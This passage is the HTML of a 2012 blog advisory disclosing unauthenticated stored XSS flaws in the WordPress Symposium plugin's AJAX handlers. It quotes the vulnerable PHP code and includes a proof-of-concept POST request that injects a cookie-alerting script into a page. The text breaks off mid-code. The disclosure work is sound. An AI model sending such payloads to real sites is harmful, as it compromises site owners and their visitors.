<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="http://ceriksen.com" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>WordPress Symposium plugin multiple stored XSS vulnerabilities | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<link rel='next' title='WordPress Flexi Quote Rotator plugin multiple vulnerabilities' href='http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/' />

<link rel='canonical' href='http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/' />
<link rel='shortlink' href='http://ceriksen.com/?p=26' />
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="single single-post postid-26 single-format-standard  single-author singular">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<div id="primary">
			<div id="content" role="main">

			
				
				
<article id="post-26" class="post-26 post type-post status-publish format-standard hentry category-advisories tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<h2 class="entry-title">WordPress Symposium plugin multiple stored XSS vulnerabilities</h2>
		
		<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="4:20 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T16:20:39+00:00" pubdate>July 25, 2012</time></a>		</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49791/">Secunia Advisory SA 49791</a></p>
<p><strong>Analysis of add_to_page vulnerability</strong><br />
The first vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a>Â in the &#8220;add_to_page&#8221; action relies on a lack of validation of the $current_user variable that is declared through global. The function allows you to append text to any arbitrary page, which can be abused for a XSS attack.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254e6e136943843" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "add_to_page") {

        global $wpdb, $current_user;

        $r = 'OK';

        $shortcode = $_POST['shortcode'];
        $id = $_POST['id'];

        // get existing value
        $sql = "SELECT post_content FROM ".$wpdb-&gt;prefix."posts WHERE ID = %d";
        $tmp = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $id));       
        $tmp .= '['.$shortcode.']';

        // update
        $sql = "UPDATE ".$wpdb-&gt;prefix."posts SET post_content = %s WHERE ID = %d";
        $wpdb-&gt;query($wpdb-&gt;prepare($sql, $tmp, $id));             
       
        echo $r;
        exit;   
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-2">2</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-4">4</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-6">6</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-8">8</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-10">10</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-12">12</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-14">14</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-16">16</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-18">18</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e6e136943843-20">20</div><div class="crayon-num" data-line="crayon-53c9863254e6e136943843-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254e6e136943843-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_to_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254e6e136943843-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254e6e136943843-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254e6e136943843-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get existing value</span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT post_content FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-14">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254e6e136943843-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET post_content = %s WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e6e136943843-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9863254e6e136943843-21"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0084 seconds] -->
<p>Because there is no validation of the user calling this action before this, as the $current_user variable is only just globally included at line 156, and no valididation is made in respect to it, we have a vulnerability since globally including a variable does not guarantee that it exists. Therefor you can call this while not being authenticated, and add a XSS payload to any page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254e8e479313856" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=add_to_page&amp;id=1&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254e8e479313856-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e8e479313856-2">2</div><div class="crayon-num" data-line="crayon-53c9863254e8e479313856-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e8e479313856-4">4</div><div class="crayon-num" data-line="crayon-53c9863254e8e479313856-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e8e479313856-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254e8e479313856-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e8e479313856-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9863254e8e479313856-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e8e479313856-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">74</span></div><div class="crayon-line" id="crayon-53c9863254e8e479313856-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e8e479313856-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_to_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0075 seconds] -->
<p>If you now load the frontpage(Which is by default page 1), you will now observe that it alerts out your cookie.</p>
<p><strong>Analysis of add_new_page vulnerability</strong><br />
This vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is very much like the first one. Again it&#8217;s a lack of validation of the current user. This function, rather than add content to an existing page, serves to allow an user to create a new page with some content(A shortcode specifically, but no validation is made that it is just that). This block of code might look big and scary, big in reality most of the lines are simply SQL queries.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254e98194891822" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Add new page
if ($action == "add_new_page") {
	
	global $wpdb, $current_user;

	$r = 'OK';

	$shortcode = $_POST['shortcode'];
	$name = $_POST['name'];
	$post_name = str_replace(' ', '', strtolower($name));
	
	$wpdb-&gt;query( $wpdb-&gt;prepare( "
		INSERT INTO ".$wpdb-&gt;prefix."posts
		( 	post_author, 
			post_date,
			post_date_gmt,
			post_content,
			post_title,
			post_status,
			comment_status,
			ping_status,
			post_name,
			post_modified,
			post_modified_gmt,
			post_parent,
			menu_order,
			post_type,
			comment_count
		)
		VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )", 
	    array(
	    	$current_user-&gt;ID, 
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	'['.$shortcode.']',
	    	$name,
	    	'publish',
	    	'closed',
	    	'open',
	    	$post_name,
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	0,
	    	0,
	    	'page',
	    	0
	    	) 
	    ) );
	    
	    // get new ID
		$new_id = $wpdb-&gt;insert_id;
		
		// page meta data
		$wpdb-&gt;query( $wpdb-&gt;prepare( "
			INSERT INTO ".$wpdb-&gt;base_prefix."postmeta
			( 	post_id, 
				meta_key,
				meta_value
			)
			VALUES ( %d, %s, %s )", 
		    array(
		    	$new_id, 
		    	'_wp_page_template',
		    	'sidebar-page.php'
		    	) 
		    ) );
	    		
	    // update guid
	    $url = get_bloginfo('url');
    	if ($url[strlen($url)-1] == '/') { $url = substr($url,0,-1); }
    	$url .= '/?p='.$new_id;
		$sql = "UPDATE ".$wpdb-&gt;prefix."posts SET guid = '%s' WHERE ID = %d";
		$wpdb-&gt;query($wpdb-&gt;prepare($sql, $url, $new_id)); 
	    	    
	echo $r;
	exit;	
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254e98194891822-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-2">2</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-4">4</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-6">6</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-8">8</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-10">10</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-12">12</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-13">13</div><div class="crayon-num crayon-striped-num" 